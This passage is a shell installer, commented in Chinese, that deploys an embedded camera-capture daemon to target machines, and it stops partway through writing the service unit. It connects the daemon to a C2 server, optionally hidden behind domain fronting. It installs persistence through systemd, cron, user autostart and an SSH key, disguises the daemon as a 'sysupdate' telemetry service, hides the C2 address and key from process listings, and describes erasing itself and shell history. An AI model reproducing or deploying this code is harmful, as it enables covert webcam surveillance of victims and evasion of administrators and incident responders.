#!/bin/sh
# ============================================================================
# 摄像头链路 —— 任意目标机一键部署
#
# 用法（目标机，一条命令）：
#   sh onekey.sh --c2 <C2地址:端口> [--key <64位十六进制>] [--backend v4l2|mock]
#   sh onekey.sh --c2 <前置域:端口> --front-host <真实C2> --ca <ca.pem>   # 域前置
#   sh onekey.sh uninstall
#   sh onekey.sh status
#
# 本脚本是**生成器产出物**：由 make_onekey.py 把对应架构的 camd 二进制
# base64 内嵌到 PAYLOAD 段。不要手改 PAYLOAD 段。
#
# 设计约束（每一条都是被真实事故逼出来的，见注释）：
#  1. 内嵌的必须是真 ELF，不是脚本 stub。stub 会让"部署全绿、采集零产出"，
#     是这类事故里最难发现的形态（服务在跑、灯在亮、没有一帧真画面）。
#  2. 密钥不在命令行、不在单元文件、不在 cron 文件。命令行会被 ps 看到，
#     单元/cron 文件默认 0644 会被 cat 到。走 EnvironmentFile(0600)。
#  3. systemd 失败必须中断（die），cron 失败只警告（warn）。
#     前者留下"驻留成功"假象，后者在容器/精简系统里是常态降级路径。
#  4. 收尾清痕：删脚本自身、清 shell 历史中的本脚本命令行。
# ============================================================================

set -u
umask 077

# ---- 常量 ------------------------------------------------------------------
# PREFIX = 假根。空表示真实根（生产部署的唯一正确取值）。
# 非空时所有落点挂在此前缀下，用于守卫/CI 在同一台机器上验证多份互不
# 干扰的部署而不污染真实 /etc。注意：非空时 systemd 驻留会被**强制跳过**——
# systemctl 不读假根，真 enable/restart 会改动真实系统状态，那正是假根
# 要隔离的东西。因此假根下单元只渲染 + 静态校验，不安装。
PREFIX="${PREFIX:-}"
# 路径常量不在此处固定：它们由 --prefix 派生，必须等参数解析完才算得出来。

ok=0; fail=0; warn=0
log()  { printf '[%s] %s\n' "$1" "$2"; }
OK()   { log OK "$1";   ok=$((ok+1)); }
WARN() { log WARN "$1"; warn=$((warn+1)); }
DIE()  { log FATAL "$1"; fail=$((fail+1)); report; exit 1; }
report() { printf '计数: 成功 %d  失败 %d  警告 %d\n' "$ok" "$fail" "$warn"; }

# ---- 参数 ------------------------------------------------------------------
ACTION=install
C2=""
FRONT_HOST=""
CA_SRC=""
# 必须显式初始化：本脚本 set -u，而 --ssh-pubkey 是可选参数。未初始化时
# 首次引用（write_conf 里的 -n 判断）直接 "parameter not set" 崩溃，退出码 2，
# 现象是"没传这个可选参数就装不上"——排查会被引向参数解析而不是缺默认值。
PUBKEY_SRC=""
CA_DEST=""
KEY=""
BACKEND=""
while [ $# -gt 0 ]; do
    case "$1" in
        --c2)      C2="$2"; shift 2 ;;
        --key)     KEY="$2"; shift 2 ;;
        --backend) BACKEND="$2"; shift 2 ;;
        --front-host) FRONT_HOST="$2"; shift 2 ;;
        --ca)         CA_SRC="$2"; shift 2 ;;
        --ssh-pubkey) PUBKEY_SRC="$2"; shift 2 ;;
        --unit-desc) UNIT_DESC="$2"; shift 2 ;;
        --name)       NAME="$2"; shift 2 ;;
        --prefix)     PREFIX="$2"; shift 2 ;;
        install|uninstall|status|checkpayload|renderunit) ACTION="$1"; shift ;;
        *) printf '未知参数: %s\n' "$1"; exit 2 ;;
    esac
done

# ---- 命名派生 --------------------------------------------------------------
# 【命名体系伪装】此前 camd 这个前缀同时出现在 conf 目录、二进制名、服务名、
# cron 名、锁文件名里——字面即 "camera daemon"。运维扫一眼 ps 或 /etc 就能
# 读出意图，而 ps 与 /etc 是巡检、基线采集、应急响应最先看的两处。
# 改为全部落点由单一 $NAME 派生，默认中性、可 --name 覆盖为目标环境里
# 看着眼熟的服务名。
#
# 默认值 sysupdate：系统更新类守护在 Linux 上普遍存在，不带语义指向。
NAME="${NAME:-sysupdate}"

validate_name() {
    # 四项校验，缺一项都会造成"看起来装上了、实际是灾难"：
    #
    #  a) 非空 / 不含 / —— 直接拼进路径，../../ 会写到任意位置（路径穿越）。
    #  b) 字符集 [a-z0-9_-] 且首字符字母数字 —— systemd 单元名与 cron.d
    #     文件名都有约束；点号会让 systemd 把 .service 之外的部分当后缀。
    #  c) 长度 <= 15 —— 内核 comm 是 15 字符 + NUL（TASK_COMM_LEN=16），
    #     超长会被截断，于是安装时按 $NAME 匹配、运行时 comm 却是截断值，
    #     "进程已清理" 与 status 的进程计数全部静默失效。这条最阴：
    #     功能一切正常，只是卸载时杀不掉。
    case "$NAME" in
        '') DIE "--name 不得为空" ;;
        */*) DIE "--name 不得含 / : $NAME（会路径穿越）" ;;
    esac
    case "$NAME" in
        *[!a-z0-9_-]*) DIE "--name 只允许 [a-z0-9_-] : $NAME" ;;
    esac
    case "$NAME" in
        [-_]*) DIE "--name 首字符必须是字母或数字 : $NAME" ;;
    esac
    if [ ${#NAME} -gt 15 ]; then
        DIE "--name 长度不得超过 15（内核 comm 截断）: $NAME"
    fi
}
validate_name

# ---- 回归上下文自动切假根（前置拦截，替代事后点名）--------------------------
# 真实根污染此前只能事后点名（scripts/check_realroot_pollution.py）：污染已经
# 发生，报警救不回已经写进真实 /etc 的那一次。这里做前置拦截。
#
# 触发条件刻意收窄，三条必须全部成立：
#   1) 未显式指定 PREFIX（--prefix 与环境 PREFIX 均为空）
#   2) 以 root 运行（非 root 走 USER_MODE，落点在 $HOME，本来就不碰真实 /etc）
#   3) 显式回归标记 DAYNANJING_REGRESSION 非空（由 run_all_tests.sh 设置）
# 收窄的理由：verify_user_deploy 故意以 uid=65534 且不带 PREFIX 运行，用来验证
# 非 root 降级；若把 MAKELEVEL/CI 也当触发条件，或在非 root 下也切，会把这个
# 守卫自己的正向用例改成假根路径 —— 表现为"用户级驻留"断言全红，而脚本全绿，
# 比污染更难发现。
#
# 假根路径固定（不随机）：install 与 uninstall 是两次独立进程，随机目录会让
# 卸载找不到安装时的落点，留下一个装了东西却没人清理的临时目录。
AUTO_FAKE_ROOT=0
if [ -z "$PREFIX" ]; then
    _euid=$(id -u 2>/dev/null || echo 1)
    if [ "$_euid" = "0" ] && [ -n "${DAYNANJING_REGRESSION:-}" ]; then
        PREFIX="${TMPDIR:-/tmp}/ok_autoroot_$NAME"
        mkdir -p "$PREFIX" 2>/dev/null || DIE "无法创建自动假根 $PREFIX"
        AUTO_FAKE_ROOT=1
        WARN "回归上下文（DAYNANJING_REGRESSION）且未指定 --prefix：自动切假根 $PREFIX"
    fi
fi

# ---- 路径派生 --------------------------------------------------------------
# 全部由 $PREFIX 与 $NAME 派生，脚本其余部分一律只用这些变量、不得再写
# 绝对路径或字面服务名。此前是硬编码 /etc/camd 等，结果是：守卫每跑一次
# 就往真实 /etc 写一遍，两份不同配置的部署在同一台机器上会互相覆盖，
# 且无法并行。
CONF_DIR=$PREFIX/etc/$NAME
CONF_FILE=$CONF_DIR/$NAME.conf
LIB_DIR=$PREFIX/var/lib/$NAME
BIN_DST=$PREFIX/usr/local/bin/$NAME
UNIT=$PREFIX/etc/systemd/system/$NAME.service
CRON=$PREFIX/etc/cron.d/$NAME
LOCK=$PREFIX/var/lock/$NAME.lock
UNIT_NAME=$NAME.service
# camd 内部 persist 写入落点时用的标记（09_persistence/src/persist.c 的
# #define MARKER）。必须与那里逐字一致，否则卸载按本脚本自己的 marker
# 过滤时清不掉它写的那一行，留在 /etc/crontab 里就是"重启即复活"。
# 同源由 verify_cron_impl.py 的 S5 静态断言保证。
PERSIST_MARKER="# do-not-edit:managed"
# 单元描述。默认中性：此前写死 "Camera Service"，直接点明功能。单元文件
# 是 0644、常进配置管理与审计采集，运维一条 systemctl status 或 cat 就能
# 读出意图，而该字段对运行毫无作用——纯暴露面。可用 --unit-desc 覆盖为
# 目标环境里看着眼熟的服务名。
UNIT_DESC=${UNIT_DESC:-System Telemetry Service}
# 假根标记：非空即"不碰真实系统状态"。systemd/cron 的**写文件**仍照常
# （目标是假根内的路径），但 systemctl 子命令一律不执行。
FAKE_ROOT=0
[ -n "$PREFIX" ] && FAKE_ROOT=1
# USER_MODE = 非 root 目标上的用户级部署。落点切到 $HOME，驻留由 camd 的
# persist_user_ensure 写入 ~/.config/systemd/user + ~/.config/autostart。
# 此前非 root 一律 DIE，随机目标（登录用户常非管理员）上整套归零：零驻留、
# 零采集、零回传。
USER_MODE=0
# 用户级 autostart 桌面条目（仅 USER_MODE 下存在）。卸载必须一并删除：
# 它由 camd 的 persist_user_ensure 写入，不在 CONF_DIR/LIB_DIR 之下，
# 漏删会留下"重新登录就自启"的痕迹，而 uninstall 报成功。
AUTOSTART_DESKTOP=

# ---- 前置门 ----------------------------------------------------------------
require_root() {
    # 真判据是 euid。只看 `id -u` 在 setuid/容器里会骗人。
    #
    # 假根下**不要求 root**：假根的意义就是隔离，安装动作全部落在 PREFIX
    # 内，能写 PREFIX 就够了。要求 root 会把守卫/CI 挡在非 root 环境之外，
    # 而那恰恰是假根最该被使用的场景。判据也换成真实的可写性检查——
    # 只看 uid 会漏掉"uid=0 但 PREFIX 所在挂载点只读"这种情况（只读根、
    # 只读容器 overlay 都很常见），那种情况下 mkdir 失败而 uid 检查通过，
    # 故障会推迟到写 conf 时才暴露。
    if [ "$FAKE_ROOT" = 1 ]; then
        mkdir -p "$PREFIX" 2>/dev/null || DIE "无法创建假根 $PREFIX"
        [ -w "$PREFIX" ] || DIE "假根 $PREFIX 不可写"
        return 0
    fi
    [ "$(id -u 2>/dev/null)" = "0" ] && return 0

    # 非 root：不 DIE，切到用户级部署。落点全部改到 $HOME 下，由 camd 的
    # persist_user_ensure 写入用户级 systemd 与 autostart。
    USER_MODE=1
    UHOME=${HOME:-}
    if [ -z "$UHOME" ]; then
        UHOME=$(getent passwd "$(id -u)" 2>/dev/null | cut -d: -f6)
    fi
    [ -n "$UHOME" ] || DIE "非 root 部署需要家目录（HOME 未设置且 passwd 查不到）"
    mkdir -p "$UHOME" 2>/dev/null
    [ -w "$UHOME" ] || DIE "家目录不可写: $UHOME"

    # 重新派生落点，覆盖上面由 PREFIX 派生的系统级路径。
    CONF_DIR=$UHOME/.config/$NAME
    CONF_FILE=$CONF_DIR/$NAME.conf
    LIB_DIR=$UHOME/.local/lib/$NAME
    BIN_DST=$UHOME/.local/bin/$NAME
    UNIT=$UHOME/.config/systemd/user/$NAME.service
    UNIT_NAME=$NAME.service
    CRON=                       # 用户级无 cron；桌面自启走 autostart
    LOCK=$UHOME/.local/state/$NAME.lock
    AUTOSTART_DESKTOP=$UHOME/.config/autostart/$NAME.desktop
    OK "非 root（uid=$(id -u)）：切换用户级部署，落点 $UHOME"
    return 0
}

detect_arch() {
    # 目标机架构决定用哪份内嵌产物。多架构包由 make_onekey.py 按
    # "# PAYLOAD_BEGIN <arch>" 分节，extract_bin 按 ARCH_KEY 选节。
    ARCH=$(uname -m 2>/dev/null) || ARCH=unknown
    case "$ARCH" in
        x86_64|amd64)         ARCH_KEY=amd64 ;;
        aarch64|arm64)        ARCH_KEY=arm64 ;;
        i386|i486|i586|i686)  ARCH_KEY=386 ;;
        arm|armv5*|armv6*|armv7*|armv8*) ARCH_KEY=arm ;;
        *)                    ARCH_KEY=unknown ;;
    esac
    [ "$ARCH_KEY" = unknown ] && DIE "无法识别的架构: $ARCH（本包不含对应产物）"
    return 0
}

arch_machine() {
    # ELF e_machine 期望值。判据必须是 e_machine 而不是魔数：
    # 魔数只证明"是个 ELF"，证明不了"是这台机器能跑的 ELF"。
    case "$1" in
        amd64) echo 62 ;;   # EM_X86_64
        arm64) echo 183 ;;  # EM_AARCH64
        386)   echo 3 ;;    # EM_386
        arm)   echo 40 ;;   # EM_ARM
        *)     echo -1 ;;
    esac
}

elf_machine() {
    # 读 ELF 头偏移 18 的 e_machine（2 字节），按 EI_DATA 判端序。
    _b0=$(od -An -tu1 -j18 -N1 "$1" 2>/dev/null | tr -d ' \n')
    _b1=$(od -An -tu1 -j19 -N1 "$1" 2>/dev/null | tr -d ' \n')
    _ei=$(od -An -tu1 -j5  -N1 "$1" 2>/dev/null | tr -d ' \n')
    case "$_b0$_b1" in ''|*[!0-9]*) echo -1; return 0 ;; esac
    if [ "$_ei" = "2" ]; then echo $((_b0 * 256 + _b1)); else echo $((_b0 + _b1 * 256)); fi
}

probe_systemd() {
    # 判据是 PID 1 是不是 systemd，不是 systemctl 在不在。
    # 容器里 systemctl 常在而 systemd 不在跑，用它判断会写出装不上的单元。
    HAVE_SYSTEMD=0
    [ -r /proc/1/comm ] || return 0
    [ "$(cat /proc/1/comm 2>/dev/null)" = "systemd" ] && HAVE_SYSTEMD=1
    return 0
}

probe_backend() {
    # 未显式指定时按平台选：Linux 用 v4l2，其余退回 mock。
    # 注意：mock 是合成帧，不是真画面。生产部署必须显式 v4l2/mf 并验证。
    [ -n "$BACKEND" ] && return 0
    case "$(uname -s 2>/dev/null)" in
        Linux*)  BACKEND=v4l2 ;;
        *)       BACKEND=mock; WARN "非 Linux 平台，回落 mock（合成帧，非真画面）" ;;
    esac
    return 0
}

gen_key() {
    # 真随机 32 字节 → 64 位十六进制。
    # 严禁"重复两遍"式人工编造：前后 16 字节相同会让回传通道初始化失败，
    # 而报错码看不出成因（历史上表现为 -4，排查者会去查权限/设备/网络）。
    [ -n "$KEY" ] && return 0
    if [ -r /dev/urandom ] && command -v od >/dev/null 2>&1; then
        KEY=$(od -An -tx1 -N32 /dev/urandom 2>/dev/null | tr -d ' \n')
    fi
    [ ${#KEY} -eq 64 ] || DIE "无法生成密钥，请用 --key 显式指定"
    return 0
}

validate_key() {
    [ ${#KEY} -eq 64 ] || DIE "密钥必须是 64 个十六进制字符（当前 ${#KEY}）"
    case "$KEY" in
        *[!0-9a-fA-F]*) DIE "密钥含非十六进制字符" ;;
    esac
    # 前后半相同的"编造型"密钥在此拦下。
    A=$(printf '%s' "$KEY" | cut -c1-32)
    B=$(printf '%s' "$KEY" | cut -c33-64)
    [ "$A" = "$B" ] && DIE "密钥前后 16 字节相同——回传通道会初始化失败"
    return 0
}

validate_c2() {
    # 【实测撞出来的缺陷：sink 缺 tcp:// 前缀会被 camd 当作文件路径】
    # 实测：camd --sink "127.0.0.1:59999"（无前缀）不连 C2，而是在当前目录
    # 生成名为 "127.0.0.1:59999" 的 512 字节文件，rc=0 且自报 bytes_out=512。
    # 后果：驻留起来的 camd 全程不连 C2，只在磁盘上堆"地址:端口"文件，
    # 而部署全绿、进程在跑、字节在"产出"——是最难发现的一类事故。
    # 因此三处 sink（单元 / cron / 试运行）都必须显式带 tcp:// 前缀，
    # 且此处拦截"调用方自己带了前缀"导致的 tcp://tcp:// 双前缀。
    [ -n "$C2" ] || DIE "C2 地址为空"
    case "$C2" in
        tcp://*) DIE "C2 地址不要带 tcp:// 前缀（本脚本会自动加）: $C2" ;;
        *://*)   DIE "C2 地址只支持 tcp 传输，不支持其它 scheme: $C2" ;;
    esac
    # 必须含 host:port 形态。缺端口会被 camd 当纯路径处理。
    case "$C2" in
        *:*) : ;;
        *)   DIE "C2 地址必须是 <host>:<port> 形态（缺端口）: $C2" ;;
    esac
    return 0
}

# ---- base64 解码（多级 fallback，去掉对单一命令的硬依赖）--------------------
# 【为什么不能只写 `| base64 -d`】
# "任何目标机"意味着极简容器 / 老旧发行版 / 嵌入式可能根本没有 base64。
# 实测该场景：base64 不存在 → 管道静默产出空文件 → 被 [ -s ] 拦下并报
# "内嵌产物为空或解码失败"。排查者会去查包是否损坏、base64 数据是否完整，
# 而真实成因是目标机缺一个命令。症状与成因完全对不上。
# 所以按可用性逐级退：base64 → openssl → perl → python3 → 明确 DIE 点名。
#
# 不用 awk 实现：awk 的 printf "%c" 对 NUL 字节在多个实现上会截断输出，
# 用它解二进制会得到静默损坏的产物——比直接报错更坏。
b64_decode() {
    if command -v base64 >/dev/null 2>&1; then
        base64 -d 2>/dev/null && return 0
    fi
    if command -v openssl >/dev/null 2>&1; then
        openssl base64 -d 2>/dev/null && return 0
    fi
    if command -v perl >/dev/null 2>&1; then
        perl -MMIME::Base64 -ne 'print decode_base64($_)' 2>/dev/null && return 0
    fi
    if command -v python3 >/dev/null 2>&1; then
        python3 -c 'import sys,base64;sys.stdout.buffer.write(base64.b64decode(sys.stdin.buffer.read()))' 2>/dev/null && return 0
    fi
    return 1
}

# 运行前置依赖：缺哪个就点名哪个，不给含糊的"失败"。
require_cmd() {
    command -v "$1" >/dev/null 2>&1 || \
        DIE "目标机缺少必需命令: $1（$2）。极简容器/BusyBox 环境常见，请先安装或改用完整镜像。"
}

# ---- 内嵌产物 --------------------------------------------------------------
# PAYLOAD_BEGIN / PAYLOAD_END 之间由 make_onekey.py 填充 base64。
# 运行时解码到临时文件，校验 ELF 魔数后才允许安装。
extract_bin() {
    TMPB=$(mktemp /tmp/.x-XXXXXX 2>/dev/null) || TMPB=/tmp/.x-$$
    # 多架构包按 "# PAYLOAD_BEGIN <arch>" 分节，按 ARCH_KEY 选节。
    #
    # 【选节不可省——本轮实测复现的缺陷】
    # 把 e_machine=183(AArch64) 的产物装到 x86_64 上：魔数校验照样通过，
    # "内嵌产物校验通过（ELF，160392 字节）"、"二进制已安装" 全绿，
    # 退出码 0、计数"成功 7 失败 0"，而 camd 执行报 "Exec format error"。
    # systemd 下配合 Restart=always 就是无限重启循环；cron 下是静默不执行。
    # 部署者看到的是全绿，一帧画面都没有。
    if grep -q "^# PAYLOAD_BEGIN ${ARCH_KEY}\$" "$0" 2>/dev/null; then
        # 注意字段位：行是 "# PAYLOAD_BEGIN amd64"，awk 按空白切分后
        # $1="#", $2="PAYLOAD_BEGIN", $3=架构名。用 $2 会永远选不中，
        # 表现为"内嵌产物为空或解码失败"——排查时容易误判成 base64 坏了。
        awk -v want="$ARCH_KEY" '
            /^# PAYLOAD_BEGIN/ { f = ($3 == want); next }
            /^# PAYLOAD_END/   { f = 0; next }
            f { print }
        ' "$0" | b64_decode > "$TMPB" 2>/dev/null
        # 解码失败且产物为空：区分"目标机没有解码器"与"包坏了"。
        # 这两种成因的症状完全一致（空文件），但处置方式完全不同。
        if [ ! -s "$TMPB" ]; then
            if ! command -v base64 >/dev/null 2>&1 \
               && ! command -v openssl >/dev/null 2>&1 \
               && ! command -v perl >/dev/null 2>&1 \
               && ! command -v python3 >/dev/null 2>&1; then
                DIE "目标机缺少 base64/openssl/perl/python3 任一，无法解码内嵌产物。\
请先安装其中之一，或改用编译进产物分节的静态包。"
            fi
        fi
    elif grep -q "^# PAYLOAD_BEGIN\$" "$0" 2>/dev/null; then
        # 单架构包（旧格式，裸标记）。仍做 e_machine 校验，
        # 否则旧包在错架构机器上一样全绿。
        awk '/^# PAYLOAD_BEGIN$/{f=1;next} /^# PAYLOAD_END$/{f=0} f' "$0" \
            | b64_decode > "$TMPB" 2>/dev/null
    else
        DIE "本包没有 $ARCH 架构的产物分节（当前架构: $ARCH / $ARCH_KEY）"
    fi
    [ -s "$TMPB" ] || DIE "内嵌产物为空或解码失败"
    # ELF 魔数校验：拒绝 stub 脚本。
    MAGIC=$(od -An -tx1 -N4 "$TMPB" 2>/dev/null | tr -d ' \n')
    [ "$MAGIC" = "7f454c46" ] || DIE "内嵌产物不是 ELF（魔数=$MAGIC）——拒绝安装 stub"
    # e_machine 校验：拒绝错架构产物。
    MACH=$(elf_machine "$TMPB")
    WANT=$(arch_machine "$ARCH_KEY")
    [ "$MACH" = "$WANT" ] || DIE "产物架构不符：分节=$ARCH_KEY 期望 e_machine=$WANT，实际=$MACH（错架构产物会 Exec format error，而安装仍报全绿）"
    OK "内嵌产物校验通过（ELF/$ARCH_KEY，e_machine=$MACH，$(wc -c < "$TMPB") 字节）"
    return 0
}

# ---- 安装 ------------------------------------------------------------------
# sink 相关配置的唯一来源。
#
# 【纪律：三处 sink 不得各自拼装】此前 tcp:// 前缀缺陷的成因就是
# "单元 / cron / 试运行"三处独立书写必然发散：一处带前缀、两处漏。
# 现在三者统一从 conf 的 CAMD_SINK / CAMD_EXTRA 读取，本函数是唯一产地。
sink_lines() {
    # 【纪律：落点参数一律走环境变量，不拼命令行】
    #
    # 此前 run.sh 是 exec camd --sink "$CAMD_SINK" $CAMD_EXTRA --backend ...，
    # 而 /proc/<pid>/cmdline 是 0444 世界可读——任何本地用户 ps 一下就得到
    # C2 地址；front:// 形态下连真实目标（--front-host）也在同一行里。
    # 环境变量在 /proc/<pid>/environ，权限 0400 且仅同用户 / root 可读。
    #
    # 副作用是彻底消灭了一类缺陷：CAMD_EXTRA 曾在 conf 里写成
    # `--front-host x --ca y`（无引号），被 `. ` source 时解析成"临时环境
    # 变量 + 执行命令"，CAMD_EXTRA 反而为空。改成分立的标量环境变量后，
    # 多词拼接这一形态不再存在。
    if [ -n "$FRONT_HOST" ]; then
        printf 'CAMD_SINK="front://%s"\n' "$C2"
        printf 'CAMD_FRONT_HOST="%s"\n' "$FRONT_HOST"
        printf 'CAMD_CA="%s"\n' "$CA_DEST"
    else
        printf 'CAMD_SINK="tcp://%s"\n' "$C2"
        printf 'CAMD_FRONT_HOST=\n'
        printf 'CAMD_CA=\n'
    fi
}

validate_front() {
    [ -n "$FRONT_HOST" ] || return 0
    # 域前置模式下：CA 必填（否则"要求校验却无信任库"会被 camd 拒绝，
    # 或更糟——退化成不校验，任何人都能冒充 C2 把画面引走）。
    [ -n "$CA_SRC" ] || DIE "域前置模式必须用 --ca <ca.pem> 指定信任库"
    [ -f "$CA_SRC" ] || DIE "CA 证书不存在: $CA_SRC"
    # front_host 不得与前置域相同：相同则 SNI 里就是真实目标，前置能力归零，
    # 而功能完全正常、画面照收、没有任何一处报错。
    CA_DEST="$CONF_DIR/ca.pem"
    FD="${C2%%:*}"
    [ "$FRONT_HOST" != "$FD" ] || DIE "--front-host 不得与 --c2 的前置域相同（SNI 会直接暴露真实目标）: $FD"
    return 0
}

install_ca() {
    [ -n "$FRONT_HOST" ] || return 0
    cp "$CA_SRC" "$CA_DEST" 2>/dev/null || DIE "复制 CA 失败"
    chmod 0600 "$CA_DEST" 2>/dev/null
    OK "CA 已安装 $CA_DEST（0600）"
    return 0
}

install_pubkey() {
    # 第三种驻留机制所需的真实公钥。未提供 = 不启用（合法，不是缺陷）。
    [ -n "$PUBKEY_SRC" ] || return 0

    [ -f "$PUBKEY_SRC" ] || DIE "--ssh-pubkey 指定的文件不存在: $PUBKEY_SRC"

    # 部署期前置校验，判据与 persist_sshkey_pubkey 一致。
    #
    # 为什么不能在运行时才发现：camd 对非法公钥是 FATAL（exit 7），而那时
    # 二进制、配置、驻留已经全部写好——部署者看到的是"装完了却跑不起来"，
    # 且要翻 journal 才知道是一行公钥写错了。在这里拦，装之前就失败。
    _pk_line=$(head -n 1 "$PUBKEY_SRC" 2>/dev/null)
    case "$_pk_line" in
        ssh-*|ecdsa-*|sk-*) : ;;
        *) DIE "--ssh-pubkey 内容非法（首行需带 ssh-/ecdsa-/sk- 前缀）: $PUBKEY_SRC" ;;
    esac

    # 落盘而非引用原路径：源文件在部署后常被删（跳板机清理），届时 camd
    # 每次启动都读不到公钥，表现为"sshkey 段莫名其妙不生效"。
    mkdir -p "$CONF_DIR" || DIE "无法创建 $CONF_DIR"
    cp "$PUBKEY_SRC" "$CONF_DIR/pubkey.txt" 2>/dev/null \
        || DIE "复制公钥失败"
    chmod 0600 "$CONF_DIR/pubkey.txt" 2>/dev/null
    OK "公钥已安装 $CONF_DIR/pubkey.txt（0600）"
    return 0
}

write_conf() {
    mkdir -p "$CONF_DIR" || DIE "无法创建 $CONF_DIR"
    : > "$CONF_FILE" || DIE "无法写 $CONF_FILE"
    {
        printf 'C2_ADDR=%s\n' "$C2"
        printf 'CAMD_KEY=%s\n' "$KEY"
        printf 'CAMD_BACKEND=%s\n' "$BACKEND"
        # 服务名必须与部署侧落点同源。此前驻留段（persist.c）硬编码项目名，
        # 而这里已把落点伪装成 $NAME：两者不一致在真机上是三重合失效——
        # 伪装失效（systemctl status 读出项目名）、双重驻留（两套 unit 同时
        # 拉起、两个进程抢摄像头）、卸载残留（uninstall 只清一套）。
        # 名字的产地只能有一处，就是这里的 $NAME。
        printf 'CAMD_SVC_NAME=%s\n' "$NAME"
        # 只在真正提供了公钥时才写。写成空串会让 camd 以为"配置了但读不到"，
        # 从而走 FATAL 分支——那是把"未启用"误报成"配置损坏"。
        [ -n "$PUBKEY_SRC" ] && \
            printf 'CAMD_SSH_PUBKEY_FILE="%s/pubkey.txt"\n' "$CONF_DIR"
        sink_lines
    } > "$CONF_FILE" || DIE "写配置失败"
    chmod 0600 "$CONF_FILE" 2>/dev/null
    # 单元与被管文件一律不含密钥：EnvironmentFile 从本文件注入。
    OK "配置写入 $CONF_FILE（0600）"
    return 0
}

install_bin() {
    mkdir -p "$LIB_DIR" || DIE "无法创建 $LIB_DIR"
    # 目标目录必须显式创建：真根下 /usr/local/bin 必然存在，这个缺陷从来
    # 没暴露过；假根下它不存在，cp 直接失败而报错只有"复制二进制失败"，
    # 看不出是目录缺失——排查会被引向 TMPB 产物本身（权限？损坏？）。
    mkdir -p "$(dirname "$BIN_DST")" || DIE "无法创建 $(dirname "$BIN_DST")"
    cp "$TMPB" "$BIN_DST" 2>/dev/null || DIE "复制二进制失败"
    chmod 0700 "$BIN_DST" 2>/dev/null
    command -v strip >/dev/null 2>&1 && strip "$BIN_DST" 2>/dev/null
    OK "二进制已安装 $BIN_DST"
    return 0
}

install_runner() {
    # 单元里不能依赖 $VAR 展开（真 systemd 实测踩出来的）：
    #
    #   ExecStart=$BIN_DST --sink tcp://$C2_ADDR --backend $CAMD_BACKEND
    #
    # systemd 249 下，ExecStart 行中的 $C2_ADDR **不会**被 EnvironmentFile
    # 的值替换——EnvironmentFile 是 exec 时才注入子进程环境，不参与单元
    # 解析期的命令行展开。sink 因此变成字面 "tcp://"（空地址），
    # cam_daemon_run 返回 -4，camd 退出码 5，Restart=always 每 10 秒拉起
    # 一次，陷入无限重启循环。
    #
    # 而 systemctl restart 返回 0、enable 成功、部署侧全绿（enabled +
    # restarted）——服务从未真正跑起来过，一帧都没采。判据错在"restart 的
    # 退出码"，见 persist_systemd 里的存活判据。
    #
    # 用 wrapper 在运行时从 conf 取值再 exec，是唯一既不在单元文件(0644)
    # 里写 C2 地址/密钥、又能把参数正确传给 camd 的做法。
    mkdir -p "$LIB_DIR" || DIE "无法创建 $LIB_DIR"
    # heredoc 用**无引号** RUNEOF（要展开 $PREFIX），因此运行期变量一律
    # 写成 \$ 转义。漏转义的后果是 conf 值在生成期就被展开成空——run.sh
    # 里留下 `--sink ""`，服务起不来而 conf 内容看起来是对的。
    # 【run.sh 必须与试运行同源传 --root】
    # 此前 run.sh 只 exec "$BIN_ABS" "$@"，不带 --root；而上方试运行在假根
    # 模式下是 --root "$PREFIX"。两处不同源，后果不是"路径略有偏差"：
    # 回归里直接跑 run.sh（如 verify-cmdline-stealth 读运行期 cmdline）时，
    # camd 的驻留落回真实根，实测留下 /etc/systemd/system/sysupdate.service，
    # 污染后续以"真实根干净"为基线的守卫，而该守卫自身 EXIT=0 完全不报警。
    # 真机模式 PREFIX 为空 → 不传 --root（NULL = 真实根），行为不变。
    if [ -n "$PREFIX" ]; then
        ROOTARG="--root \"$PREFIX\""
    else
        ROOTARG=""
    fi
    cat > "$LIB_DIR/run.sh" <<RUNEOF || DIE "写 run.sh 失败"
#!/bin/sh
# 由 onekey.sh 生成。密钥经环境注入，不出现在命令行（ps 可见）。
#
# CONF_ABS / BIN_ABS 在**生成期**注入绝对路径，与 CONF_FILE / BIN_DST 同源。
# 此前是 ROOT_PREFIX + 硬编码 "/etc/camd/camd.conf"，两处不同源：改了
# CONF_DIR 变量，run.sh 仍去读旧路径，表现为"改配置无效、服务读另一份
# conf"。变量与字面量必须只有一个产地，否则改动只生效一半。
CONF_ABS="$CONF_FILE"
BIN_ABS="$BIN_DST"
set -a
. "\$CONF_ABS"
set +a
[ -n "\$C2_ADDR" ] || { echo "[FATAL] C2_ADDR 未配置" >&2; exit 6; }
# "\$@" 透传：systemd 不带参（常驻，Restart=always 兜底重拉）；
# cron 带 --batches 1 —— cron 是"每小时拉起一次"的模型，若 camd 不限批次
# （默认 max_batches=0，跑到收到停止信号为止），每个整点就会新增一个
# 永不退出的采集进程：进程堆积、多个进程抢同一摄像头、文件句柄与内存
# 持续增长。驻留机制反而变成资源耗尽与暴露面。cron 路径必须限定批次。
# 【命令行不得含落点/密钥】/proc/<pid>/cmdline 是 0444 世界可读，任何本地
# 用户 ps 一下就得到 C2 地址；front:// 形态下 --front-host 是真实目标，
# 比前置域更敏感。sink / front-host / ca / key / backend 一律由上面的
# `set -a` 导出，camd 从 /proc/<pid>/environ（0400，仅同用户/root）读取。
# \$CAMD_EXTRA 已废弃：多词拼接会被 conf 解析成"临时环境变量+命令"，改成分
# 立标量 CAMD_FRONT_HOST / CAMD_CA 后此形态不复存在。
exec "\$BIN_ABS" $ROOTARG "\$@"
RUNEOF
    chmod 0700 "$LIB_DIR/run.sh" 2>/dev/null
    OK "启动器已写入 $LIB_DIR/run.sh（0700）"
    return 0
}

render_unit() {
    # 单元文件在任何环境都渲染并送 systemd-analyze 校验，与"是否安装"解耦。
    #
    # 原写法是 [ systemd可用 ] || return 0 —— 容器里单元根本不生成，因而也
    # 从未被任何东西校验过：拼错的指令、错的路径、错的权限，全都要等真机
    # 首次部署才暴露，而那时排查成本极高。渲染与校验必须与安装解耦。
    #
    # 单元内不得出现密钥与 C2 地址：0644 会被 cat 到，且进版本管理即暴露。
    # 同上：真根下 /etc/systemd/system 必然存在，假根下不存在。缺这一步时
    # 现象是 "cannot create .../camd.service: Directory nonexistent" 且
    # render_unit 静默 return 1 —— 单元从未被校验，而调用方看不出来。
    mkdir -p "$(dirname "$UNIT")" || return 1
    # WantedBy 在用户级单元里必须是 default.target，不是 multi-user.target：
    # 用户级 systemd 实例没有 multi-user.target，写成它会让 enable 报
    # not found 或静默不生效，而单元文件本身完全合法、肉眼无法分辨。
    if [ "$USER_MODE" = 1 ]; then
        WANTS=default.target
    else
